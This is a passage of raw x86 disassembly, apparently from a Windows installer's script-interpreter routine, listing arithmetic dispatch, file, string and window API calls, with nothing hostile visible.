  4016d4:	eb 09                	jmp    0x4016df
  4016d6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4016dd:	88 1f                	mov    %bl,(%edi)
  4016df:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4016e2:	0f 85 a3 11 00 00    	jne    0x40288b
  4016e8:	68 00 04 00 00       	push   $0x400
  4016ed:	57                   	push   %edi
  4016ee:	57                   	push   %edi
  4016ef:	ff 15 68 70 40 00    	call   *0x407068
  4016f5:	e9 91 11 00 00       	jmp    0x40288b
  4016fa:	6a ff                	push   $0xffffffff
  4016fc:	e8 f5 12 00 00       	call   0x4029f6
  401701:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401704:	51                   	push   %ecx
  401705:	56                   	push   %esi
  401706:	68 00 04 00 00       	push   $0x400
  40170b:	53                   	push   %ebx
  40170c:	50                   	push   %eax
  40170d:	53                   	push   %ebx
  40170e:	ff 15 64 70 40 00    	call   *0x407064
  401714:	85 c0                	test   %eax,%eax
  401716:	0f 85 6f 11 00 00    	jne    0x40288b
  40171c:	e9 0f 0f 00 00       	jmp    0x402630
  401721:	6a ef                	push   $0xffffffef
  401723:	e8 ce 12 00 00       	call   0x4029f6
  401728:	50                   	push   %eax
  401729:	56                   	push   %esi
  40172a:	e8 b4 3f 00 00       	call   0x4056e3
  40172f:	e9 72 fe ff ff       	jmp    0x4015a6
  401734:	6a 31                	push   $0x31
  401736:	e8 bb 12 00 00       	call   0x4029f6
  40173b:	8b f0                	mov    %eax,%esi
  40173d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401740:	83 e0 07             	and    $0x7,%eax
  401743:	56                   	push   %esi
  401744:	89 75 f8             	mov    %esi,-0x8(%ebp)
  401747:	89 45 08             	mov    %eax,0x8(%ebp)
  40174a:	e8 ee 3d 00 00       	call   0x40553d
  40174f:	56                   	push   %esi
  401750:	be 50 9b 40 00       	mov    $0x409b50,%esi
  401755:	85 c0                	test   %eax,%eax
  401757:	74 08                	je     0x401761
  401759:	56                   	push   %esi
  40175a:	e8 7e 42 00 00       	call   0x4059dd
  40175f:	eb 17                	jmp    0x401778
  401761:	68 00 98 42 00       	push   $0x429800
  401766:	56                   	push   %esi
  401767:	e8 71 42 00 00       	call   0x4059dd
  40176c:	50                   	push   %eax
  40176d:	e8 5e 3d 00 00       	call   0x4054d0
  401772:	50                   	push   %eax
  401773:	e8 81 42 00 00       	call   0x4059f9
  401778:	56                   	push   %esi
  401779:	e8 c1 44 00 00       	call   0x405c3f
  40177e:	bf 50 a3 40 00       	mov    $0x40a350,%edi
  401783:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  401787:	7c 31                	jl     0x4017ba
  401789:	56                   	push   %esi
  40178a:	e8 49 45 00 00       	call   0x405cd8
  40178f:	33 c9                	xor    %ecx,%ecx
  401791:	3b c3                	cmp    %ebx,%eax
  401793:	74 10                	je     0x4017a5
  401795:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401798:	83 c0 14             	add    $0x14,%eax
  40179b:	51                   	push   %ecx
  40179c:	50                   	push   %eax
  40179d:	ff 15 60 70 40 00    	call   *0x407060
  4017a3:	8b c8                	mov    %eax,%ecx
  4017a5:	8b 45 08             	mov    0x8(%ebp),%eax
  4017a8:	83 c0 fd             	add    $0xfffffffd,%eax
  4017ab:	0d 00 00 00 80       	or     $0x80000000,%eax
  4017b0:	23 c1                	and    %ecx,%eax
  4017b2:	f7 d8                	neg    %eax
  4017b4:	1b c0                	sbb    %eax,%eax
  4017b6:	40                   	inc    %eax
  4017b7:	89 45 08             	mov    %eax,0x8(%ebp)
  4017ba:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017bd:	75 06                	jne    0x4017c5
  4017bf:	56                   	push   %esi
  4017c0:	e8 d0 3e 00 00       	call   0x405695
  4017c5:	33 c0                	xor    %eax,%eax
  4017c7:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  4017cb:	0f 95 c0             	setne  %al
  4017ce:	40                   	inc    %eax
  4017cf:	50                   	push   %eax
  4017d0:	68 00 00 00 40       	push   $0x40000000
  4017d5:	56                   	push   %esi
  4017d6:	e8 d9 3e 00 00       	call   0x4056b4
  4017db:	83 f8 ff             	cmp    $0xffffffff,%eax
  4017de:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4017e1:	75 76                	jne    0x401859
  4017e3:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017e6:	75 53                	jne    0x40183b
  4017e8:	68 00 40 42 00       	push   $0x424000
  4017ed:	57                   	push   %edi
  4017ee:	e8 ea 41 00 00       	call   0x4059dd
  4017f3:	56                   	push   %esi
  4017f4:	68 00 40 42 00       	push   $0x424000
  4017f9:	e8 df 41 00 00       	call   0x4059dd
  4017fe:	ff 75 f0             	push   -0x10(%ebp)
  401801:	68 50 9f 40 00       	push   $0x409f50
  401806:	e8 f4 41 00 00       	call   0x4059ff
  40180b:	57                   	push   %edi
  40180c:	68 00 40 42 00       	push   $0x424000
  401811:	e8 c7 41 00 00       	call   0x4059dd
  401816:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401819:	c1 f8 03             	sar    $0x3,%eax
  40181c:	50                   	push   %eax
  40181d:	68 50 9f 40 00       	push   $0x409f50
  401822:	e8 77 3a 00 00       	call   0x40529e
  401827:	83 e8 04             	sub    $0x4,%eax
  40182a:	0f 84 53 ff ff ff    	je     0x401783
  401830:	48                   	dec    %eax
  401831:	74 1b                	je     0x40184e
  401833:	56                   	push   %esi
  401834:	6a fa                	push   $0xfffffffa
  401836:	e9 57 fc ff ff       	jmp    0x401492
  40183b:	ff 75 f8             	push   -0x8(%ebp)
  40183e:	6a e2                	push   $0xffffffe2
  401840:	e8 36 35 00 00       	call   0x404d7b
  401845:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  401849:	e9 5a fd ff ff       	jmp    0x4015a8
  40184e:	ff 05 08 3f 42 00    	incl   0x423f08
  401854:	e9 3b 10 00 00       	jmp    0x402894
  401859:	ff 75 f8             	push   -0x8(%ebp)
  40185c:	6a ea                	push   $0xffffffea
  40185e:	e8 18 35 00 00       	call   0x404d7b
  401863:	ff 05 34 3f 42 00    	incl   0x423f34
  401869:	53                   	push   %ebx
  40186a:	53                   	push   %ebx
  40186b:	ff 75 cc             	push   -0x34(%ebp)
  40186e:	ff 75 e4             	push   -0x1c(%ebp)
  401871:	e8 e5 15 00 00       	call   0x402e5b
  401876:	ff 0d 34 3f 42 00    	decl   0x423f34
  40187c:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  401880:	8b f8                	mov    %eax,%edi
  401882:	75 06                	jne    0x40188a
  401884:	83 7d ec ff          	cmpl   $0xffffffff,-0x14(%ebp)
  401888:	74 12                	je     0x40189c
  40188a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40188d:	50                   	push   %eax
  40188e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401891:	53                   	push   %ebx
  401892:	50                   	push   %eax
  401893:	ff 75 cc             	push   -0x34(%ebp)
  401896:	ff 15 a8 70 40 00    	call   *0x4070a8
  40189c:	ff 75 cc             	push   -0x34(%ebp)
  40189f:	ff 15 ec 70 40 00    	call   *0x4070ec
  4018a5:	3b fb                	cmp    %ebx,%edi
  4018a7:	0f 8d de 0f 00 00    	jge    0x40288b
  4018ad:	83 ff fe             	cmp    $0xfffffffe,%edi
  4018b0:	75 13                	jne    0x4018c5
  4018b2:	6a e9                	push   $0xffffffe9
  4018b4:	56                   	push   %esi
  4018b5:	e8 45 41 00 00       	call   0x4059ff
  4018ba:	ff 75 f8             	push   -0x8(%ebp)
  4018bd:	56                   	push   %esi
  4018be:	e8 36 41 00 00       	call   0x4059f9
  4018c3:	eb 08                	jmp    0x4018cd
  4018c5:	6a ee                	push   $0xffffffee
  4018c7:	56                   	push   %esi
  4018c8:	e8 32 41 00 00       	call   0x4059ff
  4018cd:	68 10 00 20 00       	push   $0x200010
  4018d2:	56                   	push   %esi
  4018d3:	e9 31 09 00 00       	jmp    0x402209
  4018d8:	53                   	push   %ebx
  4018d9:	eb 34                	jmp    0x40190f
  4018db:	6a 31                	push   $0x31
  4018dd:	e8 14 11 00 00       	call   0x4029f6
  4018e2:	ff 75 dc             	push   -0x24(%ebp)
  4018e5:	50                   	push   %eax
  4018e6:	e8 b3 39 00 00       	call   0x40529e
  4018eb:	3b c3                	cmp    %ebx,%eax
  4018ed:	0f 84 69 0d 00 00    	je     0x40265c
  4018f3:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  4018f6:	0f 84 4a 01 00 00    	je     0x401a46
  4018fc:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  4018ff:	0f 85 86 0f 00 00    	jne    0x40288b
  401905:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401908:	e9 89 0f 00 00       	jmp    0x402896
  40190d:	6a f0                	push   $0xfffffff0
  40190f:	e8 e2 10 00 00       	call   0x4029f6
  401914:	ff 75 e0             	push   -0x20(%ebp)
  401917:	50                   	push   %eax
  401918:	e8 e5 39 00 00       	call   0x405302
  40191d:	e9 69 0f 00 00       	jmp    0x40288b
  401922:	6a 01                	push   $0x1
  401924:	e8 cd 10 00 00       	call   0x4029f6
  401929:	50                   	push   %eax
  40192a:	e8 c4 40 00 00       	call   0x4059f3
  40192f:	e9 84 0b 00 00       	jmp    0x4024b8
  401934:	6a 02                	push   $0x2
  401936:	e8 9e 10 00 00       	call   0x4029d9
  40193b:	6a 03                	push   $0x3
  40193d:	89 45 08             	mov    %eax,0x8(%ebp)
  401940:	e8 94 10 00 00       	call   0x4029d9
  401945:	6a 01                	push   $0x1
  401947:	8b f8                	mov    %eax,%edi
  401949:	e8 a8 10 00 00       	call   0x4029f6
  40194e:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401951:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401954:	88 1e                	mov    %bl,(%esi)
  401956:	74 09                	je     0x401961
  401958:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40195b:	0f 84 2a 0f 00 00    	je     0x40288b
  401961:	50                   	push   %eax
  401962:	e8 8c 40 00 00       	call   0x4059f3
  401967:	3b fb                	cmp    %ebx,%edi
  401969:	7d 08                	jge    0x401973
  40196b:	03 f8                	add    %eax,%edi
  40196d:	0f 88 18 0f 00 00    	js     0x40288b
  401973:	3b f8                	cmp    %eax,%edi
  401975:	7e 02                	jle    0x401979
  401977:	8b f8                	mov    %eax,%edi
  401979:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40197c:	03 c7                	add    %edi,%eax
  40197e:	50                   	push   %eax
  40197f:	56                   	push   %esi
  401980:	e8 58 40 00 00       	call   0x4059dd
  401985:	8b 7d 08             	mov    0x8(%ebp),%edi
  401988:	3b fb                	cmp    %ebx,%edi
  40198a:	0f 84 fb 0e 00 00    	je     0x40288b
  401990:	7d 0f                	jge    0x4019a1
  401992:	56                   	push   %esi
  401993:	e8 5b 40 00 00       	call   0x4059f3
  401998:	03 f8                	add    %eax,%edi
  40199a:	79 05                	jns    0x4019a1
  40199c:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40199f:	8b fb                	mov    %ebx,%edi
  4019a1:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  4019a7:	0f 8d de 0e 00 00    	jge    0x40288b
  4019ad:	88 1c 37             	mov    %bl,(%edi,%esi,1)
  4019b0:	e9 d6 0e 00 00       	jmp    0x40288b
  4019b5:	6a 20                	push   $0x20
  4019b7:	e8 3a 10 00 00       	call   0x4029f6
  4019bc:	6a 31                	push   $0x31
  4019be:	8b f0                	mov    %eax,%esi
  4019c0:	e8 31 10 00 00       	call   0x4029f6
  4019c5:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4019c8:	50                   	push   %eax
  4019c9:	56                   	push   %esi
  4019ca:	75 12                	jne    0x4019de
  4019cc:	ff 15 f0 70 40 00    	call   *0x4070f0
  4019d2:	85 c0                	test   %eax,%eax
  4019d4:	75 70                	jne    0x401a46
  4019d6:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4019d9:	e9 b8 0e 00 00       	jmp    0x402896
  4019de:	ff 15 f4 70 40 00    	call   *0x4070f4
  4019e4:	eb ec                	jmp    0x4019d2
  4019e6:	33 ff                	xor    %edi,%edi
  4019e8:	47                   	inc    %edi
  4019e9:	57                   	push   %edi
  4019ea:	e8 07 10 00 00       	call   0x4029f6
  4019ef:	68 00 04 00 00       	push   $0x400
  4019f4:	56                   	push   %esi
  4019f5:	50                   	push   %eax
  4019f6:	89 45 08             	mov    %eax,0x8(%ebp)
  4019f9:	ff 15 f8 70 40 00    	call   *0x4070f8
  4019ff:	85 c0                	test   %eax,%eax
  401a01:	74 13                	je     0x401a16
  401a03:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401a06:	74 13                	je     0x401a1b
  401a08:	56                   	push   %esi
  401a09:	ff 75 08             	push   0x8(%ebp)
  401a0c:	ff 15 f4 70 40 00    	call   *0x4070f4
  401a12:	85 c0                	test   %eax,%eax
  401a14:	75 05                	jne    0x401a1b
  401a16:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401a19:	88 1e                	mov    %bl,(%esi)
  401a1b:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  401a21:	e9 65 0e 00 00       	jmp    0x40288b
  401a26:	53                   	push   %ebx
  401a27:	e8 ad 0f 00 00       	call   0x4029d9
  401a2c:	6a 01                	push   $0x1
  401a2e:	8b f0                	mov    %eax,%esi
  401a30:	e8 a4 0f 00 00       	call   0x4029d9
  401a35:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  401a38:	75 08                	jne    0x401a42
  401a3a:	3b f0                	cmp    %eax,%esi
  401a3c:	7c 08                	jl     0x401a46
  401a3e:	7e 96                	jle    0x4019d6
  401a40:	eb 0e                	jmp    0x401a50
  401a42:	3b f0                	cmp    %eax,%esi
  401a44:	73 08                	jae    0x401a4e
  401a46:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a49:	e9 48 0e 00 00       	jmp    0x402896
  401a4e:	76 86                	jbe    0x4019d6
  401a50:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401a53:	e9 3e 0e 00 00       	jmp    0x402896
  401a58:	6a 01                	push   $0x1
  401a5a:	e8 7a 0f 00 00       	call   0x4029d9
  401a5f:	6a 02                	push   $0x2
  401a61:	8b f8                	mov    %eax,%edi
  401a63:	e8 71 0f 00 00       	call   0x4029d9
  401a68:	8b c8                	mov    %eax,%ecx
  401a6a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a6d:	83 f8 0c             	cmp    $0xc,%eax
  401a70:	77 6d                	ja     0x401adf
  401a72:	ff 24 85 a5 29 40 00 	jmp    *0x4029a5(,%eax,4)
  401a79:	03 f9                	add    %ecx,%edi
  401a7b:	eb 62                	jmp    0x401adf
  401a7d:	2b f9                	sub    %ecx,%edi
  401a7f:	eb 5e                	jmp    0x401adf
  401a81:	0f af cf             	imul   %edi,%ecx
  401a84:	8b f9                	mov    %ecx,%edi
  401a86:	eb 57                	jmp    0x401adf
  401a88:	3b cb                	cmp    %ebx,%ecx
  401a8a:	74 42                	je     0x401ace
  401a8c:	8b c7                	mov    %edi,%eax
  401a8e:	99                   	cltd
  401a8f:	f7 f9                	idiv   %ecx
  401a91:	8b f8                	mov    %eax,%edi
  401a93:	eb 4a                	jmp    0x401adf
  401a95:	0b f9                	or     %ecx,%edi
  401a97:	eb 46                	jmp    0x401adf
  401a99:	23 f9                	and    %ecx,%edi
  401a9b:	eb 42                	jmp    0x401adf
  401a9d:	33 f9                	xor    %ecx,%edi
  401a9f:	eb 3e                	jmp    0x401adf
  401aa1:	33 c0                	xor    %eax,%eax
  401aa3:	3b fb                	cmp    %ebx,%edi
  401aa5:	0f 94 c0             	sete   %al
  401aa8:	eb e7                	jmp    0x401a91
  401aaa:	3b fb                	cmp    %ebx,%edi
  401aac:	75 0e                	jne    0x401abc
  401aae:	eb 08                	jmp    0x401ab8
  401ab0:	33 ff                	xor    %edi,%edi
  401ab2:	eb 2b                	jmp    0x401adf
  401ab4:	3b fb                	cmp    %ebx,%edi
  401ab6:	74 f8                	je     0x401ab0
  401ab8:	3b cb                	cmp    %ebx,%ecx
  401aba:	74 f4                	je     0x401ab0
  401abc:	33 ff                	xor    %edi,%edi
  401abe:	47                   	inc    %edi
  401abf:	eb 1e                	jmp    0x401adf
  401ac1:	3b cb                	cmp    %ebx,%ecx
  401ac3:	74 09                	je     0x401ace
  401ac5:	8b c7                	mov    %edi,%eax
  401ac7:	99                   	cltd
  401ac8:	f7 f9                	idiv   %ecx
  401aca:	8b fa                	mov    %edx,%edi
  401acc:	eb 11                	jmp    0x401adf
  401ace:	33 ff                	xor    %edi,%edi
  401ad0:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401ad7:	eb 06                	jmp    0x401adf
  401ad9:	d3 e7                	shl    %cl,%edi
  401adb:	eb 02                	jmp    0x401adf
  401add:	d3 ff                	sar    %cl,%edi
  401adf:	57                   	push   %edi
  401ae0:	e9 7c fa ff ff       	jmp    0x401561
  401ae5:	6a 01                	push   $0x1
  401ae7:	e8 0a 0f 00 00       	call   0x4029f6
  401aec:	6a 02                	push   $0x2
  401aee:	8b f8                	mov    %eax,%edi
  401af0:	e8 e4 0e 00 00       	call   0x4029d9
  401af5:	50                   	push   %eax
  401af6:	57                   	push   %edi
  401af7:	56                   	push   %esi
  401af8:	ff 15 00 72 40 00    	call   *0x407200
  401afe:	83 c4 0c             	add    $0xc,%esp
  401b01:	e9 85 0d 00 00       	jmp    0x40288b
  401b06:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401b09:	8b 3d 50 af 40 00    	mov    0x40af50,%edi
  401b0f:	3b c3                	cmp    %ebx,%eax
  401b11:	74 44                	je     0x401b57
  401b13:	48                   	dec    %eax
  401b14:	3b fb                	cmp    %ebx,%edi
  401b16:	0f 84 df 06 00 00    	je     0x4021fb
  401b1c:	8b 3f                	mov    (%edi),%edi
  401b1e:	3b c3                	cmp    %ebx,%eax
  401b20:	75 f1                	jne    0x401b13
  401b22:	3b fb                	cmp    %ebx,%edi
  401b24:	0f 84 d1 06 00 00    	je     0x4021fb
  401b2a:	83 c7 04             	add    $0x4,%edi
  401b2d:	be 50 9b 40 00       	mov    $0x409b50,%esi
  401b32:	57                   	push   %edi
  401b33:	56                   	push   %esi
  401b34:	e8 a4 3e 00 00       	call   0x4059dd
  401b39:	a1 50 af 40 00       	mov    0x40af50,%eax
  401b3e:	83 c0 04             	add    $0x4,%eax
  401b41:	50                   	push   %eax
  401b42:	57                   	push   %edi
  401b43:	e8 95 3e 00 00       	call   0x4059dd
  401b48:	a1 50 af 40 00       	mov    0x40af50,%eax
  401b4d:	56                   	push   %esi
  401b4e:	83 c0 04             	add    $0x4,%eax
  401b51:	50                   	push   %eax
  401b52:	e9 5a 0c 00 00       	jmp    0x4027b1
  401b57:	3b d3                	cmp    %ebx,%edx
  401b59:	74 25                	je     0x401b80
  401b5b:	3b fb                	cmp    %ebx,%edi
  401b5d:	0f 84 f9 0a 00 00    	je     0x40265c
  401b63:	8d 47 04             	lea    0x4(%edi),%eax
  401b66:	50                   	push   %eax
  401b67:	56                   	push   %esi
  401b68:	e8 70 3e 00 00       	call   0x4059dd
  401b6d:	8b 07                	mov    (%edi),%eax
  401b6f:	57                   	push   %edi
  401b70:	a3 50 af 40 00       	mov    %eax,0x40af50
  401b75:	ff 15 fc 70 40 00    	call   *0x4070fc
  401b7b:	e9 0b 0d 00 00       	jmp    0x40288b
  401b80:	68 04 04 00 00       	push   $0x404
  401b85:	6a 40                	push   $0x40
  401b87:	ff 15 00 71 40 00    	call   *0x407100
  401b8d:	ff 75 dc             	push   -0x24(%ebp)
  401b90:	8b f0                	mov    %eax,%esi
  401b92:	8d 46 04             	lea    0x4(%esi),%eax
  401b95:	50                   	push   %eax
  401b96:	e8 64 3e 00 00       	call   0x4059ff
  401b9b:	a1 50 af 40 00       	mov    0x40af50,%eax
  401ba0:	89 06                	mov    %eax,(%esi)
  401ba2:	89 35 50 af 40 00    	mov    %esi,0x40af50
  401ba8:	e9 de 0c 00 00       	jmp    0x40288b
  401bad:	6a 03                	push   $0x3
  401baf:	e8 25 0e 00 00       	call   0x4029d9
  401bb4:	6a 04                	push   $0x4
  401bb6:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401bb9:	e8 1b 0e 00 00       	call   0x4029d9
  401bbe:	f6 45 f0 01          	testb  $0x1,-0x10(%ebp)
  401bc2:	89 45 08             	mov    %eax,0x8(%ebp)
  401bc5:	74 0a                	je     0x401bd1
  401bc7:	6a 33                	push   $0x33
  401bc9:	e8 28 0e 00 00       	call   0x4029f6
  401bce:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401bd1:	f6 45 f0 02          	testb  $0x2,-0x10(%ebp)
  401bd5:	74 0a                	je     0x401be1
  401bd7:	6a 44                	push   $0x44
  401bd9:	e8 18 0e 00 00       	call   0x4029f6
  401bde:	89 45 08             	mov    %eax,0x8(%ebp)
  401be1:	83 7d d8 21          	cmpl   $0x21,-0x28(%ebp)
  401be5:	6a 01                	push   $0x1
  401be7:	75 44                	jne    0x401c2d
  401be9:	e8 eb 0d 00 00       	call   0x4029d9
  401bee:	6a 02                	push   $0x2
  401bf0:	8b f8                	mov    %eax,%edi
  401bf2:	e8 e2 0d 00 00       	call   0x4029d9
  401bf7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401bfa:	c1 f9 02             	sar    $0x2,%ecx
  401bfd:	74 1e                	je     0x401c1d
  401bff:	8d 55 f8             	lea    -0x8(%ebp),%edx
  401c02:	52                   	push   %edx
  401c03:	51                   	push   %ecx
  401c04:	53                   	push   %ebx
  401c05:	ff 75 08             	push   0x8(%ebp)
  401c08:	ff 75 cc             	push   -0x34(%ebp)
  401c0b:	50                   	push   %eax
  401c0c:	57                   	push   %edi
  401c0d:	ff 15 04 72 40 00    	call   *0x407204
  401c13:	f7 d8                	neg    %eax
  401c15:	1b c0                	sbb    %eax,%eax
  401c17:	40                   	inc    %eax
  401c18:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c1b:	eb 3f                	jmp    0x401c5c
  401c1d:	ff 75 08             	push   0x8(%ebp)
  401c20:	ff 75 cc             	push   -0x34(%ebp)
  401c23:	50                   	push   %eax
  401c24:	57                   	push   %edi
  401c25:	ff 15 44 72 40 00    	call   *0x407244
  401c2b:	eb 2c                	jmp    0x401c59
  401c2d:	e8 c4 0d 00 00       	call   0x4029f6
  401c32:	6a 12                	push   $0x12
  401c34:	8b f8                	mov    %eax,%edi
  401c36:	e8 bb 0d 00 00       	call   0x4029f6
  401c3b:	8a 08                	mov    (%eax),%cl
  401c3d:	f6 d9                	neg    %cl
  401c3f:	1b c9                	sbb    %ecx,%ecx
  401c41:	23 c8                	and    %eax,%ecx
  401c43:	8a 07                	mov    (%edi),%al
  401c45:	f6 d8                	neg    %al
  401c47:	1b c0                	sbb    %eax,%eax
  401c49:	51                   	push   %ecx
  401c4a:	23 c7                	and    %edi,%eax
  401c4c:	50                   	push   %eax
  401c4d:	ff 75 08             	push   0x8(%ebp)
  401c50:	ff 75 cc             	push   -0x34(%ebp)
  401c53:	ff 15 08 72 40 00    	call   *0x407208
  401c59:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c5c:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401c5f:	0f 8c 26 0c 00 00    	jl     0x40288b
  401c65:	ff 75 f8             	push   -0x8(%ebp)
  401c68:	e9 f4 f8 ff ff       	jmp    0x401561
  401c6d:	53                   	push   %ebx
  401c6e:	e8 66 0d 00 00       	call   0x4029d9
  401c73:	50                   	push   %eax
  401c74:	ff 15 28 72 40 00    	call   *0x407228
  401c7a:	85 c0                	test   %eax,%eax
  401c7c:	0f 84 54 fd ff ff    	je     0x4019d6
  401c82:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401c85:	e9 0c 0c 00 00       	jmp    0x402896
  401c8a:	6a 02                	push   $0x2
  401c8c:	e8 48 0d 00 00       	call   0x4029d9
  401c91:	50                   	push   %eax
  401c92:	6a 01                	push   $0x1
  401c94:	e8 40 0d 00 00       	call   0x4029d9
  401c99:	50                   	push   %eax
  401c9a:	ff 15 2c 72 40 00    	call   *0x40722c
  401ca0:	e9 13 08 00 00       	jmp    0x4024b8
  401ca5:	a1 c8 3e 42 00       	mov    0x423ec8,%eax
  401caa:	03 c2                	add    %edx,%eax
  401cac:	50                   	push   %eax
  401cad:	6a eb                	push   $0xffffffeb
  401caf:	53                   	push   %ebx
  401cb0:	e8 24 0d 00 00       	call   0x4029d9
  401cb5:	50                   	push   %eax
  401cb6:	ff 15 30 72 40 00    	call   *0x407230
  401cbc:	e9 ca 0b 00 00       	jmp    0x40288b
  401cc1:	52                   	push   %edx
  401cc2:	ff 75 cc             	push   -0x34(%ebp)
  401cc5:	ff 15 2c 72 40 00    	call   *0x40722c
  401ccb:	8b f0                	mov    %eax,%esi
  401ccd:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401cd0:	50                   	push   %eax
  401cd1:	56                   	push   %esi
  401cd2:	ff 15 50 72 40 00    	call   *0x407250
  401cd8:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401cdb:	6a 10                	push   $0x10
  401cdd:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401ce1:	50                   	push   %eax
  401ce2:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401ce5:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401ce9:	50                   	push   %eax
  401cea:	53                   	push   %ebx
  401ceb:	53                   	push   %ebx
  401cec:	e8 05 0d 00 00       	call   0x4029f6
  401cf1:	50                   	push   %eax
  401cf2:	53                   	push   %ebx
  401cf3:	ff 15 34 72 40 00    	call   *0x407234
  401cf9:	50                   	push   %eax
  401cfa:	53                   	push   %ebx
  401cfb:	68 72 01 00 00       	push   $0x172
  401d00:	56                   	push   %esi
  401d01:	ff 15 44 72 40 00    	call   *0x407244
  401d07:	3b c3                	cmp    %ebx,%eax
  401d09:	0f 84 7c 0b 00 00    	je     0x40288b
  401d0f:	50                   	push   %eax
  401d10:	ff 15 44 70 40 00    	call   *0x407044
  401d16:	e9 70 0b 00 00       	jmp    0x40288b
  401d1b:	6a 48                	push   $0x48
  401d1d:	6a 5a                	push   $0x5a
  401d1f:	ff 75 cc             	push   -0x34(%ebp)
  401d22:	ff 15 38 72 40 00    	call   *0x407238
  401d28:	50                   	push   %eax
  401d29:	ff 15 40 70 40 00    	call   *0x407040
  401d2f:	50                   	push   %eax
  401d30:	6a 02                	push   $0x2
  401d32:	e8 a2 0c 00 00       	call   0x4029d9
  401d37:	50                   	push   %eax
  401d38:	ff 15 30 71 40 00    	call   *0x407130
  401d3e:	f7 d8                	neg    %eax
  401d40:	6a 03                	push   $0x3
  401d42:	a3 54 af 40 00       	mov    %eax,0x40af54
  401d47:	e8 8d 0c 00 00       	call   0x4029d9
  401d4c:	a3 64 af 40 00       	mov    %eax,0x40af64
  401d51:	8a 45 ec             	mov    -0x14(%ebp),%al
  401d54:	ff 75 e0             	push   -0x20(%ebp)
  401d57:	8a c8                	mov    %al,%cl
  401d59:	80 e1 01             	and    $0x1,%cl
  401d5c:	c6 05 6b af 40 00 01 	movb   $0x1,0x40af6b
  401d63:	88 0d 68 af 40 00    	mov    %cl,0x40af68
  401d69:	8a c8                	mov    %al,%cl
  401d6b:	80 e1 02             	and    $0x2,%cl
  401d6e:	24 04                	and    $0x4,%al
  401d70:	68 70 af 40 00       	push   $0x40af70
  401d75:	88 0d 69 af 40 00    	mov    %cl,0x40af69
  401d7b:	a2 6a af 40 00       	mov    %al,0x40af6a
  401d80:	e8 7a 3c 00 00       	call   0x4059ff
  401d85:	68 54 af 40 00       	push   $0x40af54
  401d8a:	ff 15 4c 70 40 00    	call   *0x40704c
  401d90:	e9 23 07 00 00       	jmp    0x4024b8
  401d95:	53                   	push   %ebx
  401d96:	e8 3e 0c 00 00       	call   0x4029d9
  401d9b:	6a 01                	push   $0x1
  401d9d:	8b f0                	mov    %eax,%esi
  401d9f:	e8 35 0c 00 00       	call   0x4029d9
  401da4:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401da7:	50                   	push   %eax
  401da8:	56                   	push   %esi
  401da9:	75 0b                	jne    0x401db6
  401dab:	ff 15 60 72 40 00    	call   *0x407260
  401db1:	e9 d5 0a 00 00       	jmp    0x40288b
  401db6:	ff 15 3c 72 40 00    	call   *0x40723c
  401dbc:	e9 ca 0a 00 00       	jmp    0x40288b
  401dc1:	53                   	push   %ebx
  401dc2:	e8 2f 0c 00 00       	call   0x4029f6
  401dc7:	6a 31                	push   $0x31
  401dc9:	8b f0                	mov    %eax,%esi
  401dcb:	e8 26 0c 00 00       	call   0x4029f6
  401dd0:	6a 22                	push   $0x22
  401dd2:	8b d8                	mov    %eax,%ebx
  401dd4:	e8 1d 0c 00 00       	call   0x4029f6
  401dd9:	6a 15                	push   $0x15
  401ddb:	8b f8                	mov    %eax,%edi
  401ddd:	e8 14 0c 00 00       	call   0x4029f6
  401de2:	6a ec                	push   $0xffffffec
  401de4:	e8 3a f6 ff ff       	call   0x401423
  401de9:	8a 07                	mov    (%edi),%al
  401deb:	ff 75 e8             	push   -0x18(%ebp)
  401dee:	f6 d8                	neg    %al
  401df0:	1b c0                	sbb    %eax,%eax
  401df2:	68 00 98 42 00       	push   $0x429800
  401df7:	23 c7                	and    %edi,%eax
  401df9:	50                   	push   %eax
  401dfa:	8a 06                	mov    (%esi),%al
  401dfc:	f6 d8                	neg    %al
  401dfe:	1b c0                	sbb    %eax,%eax
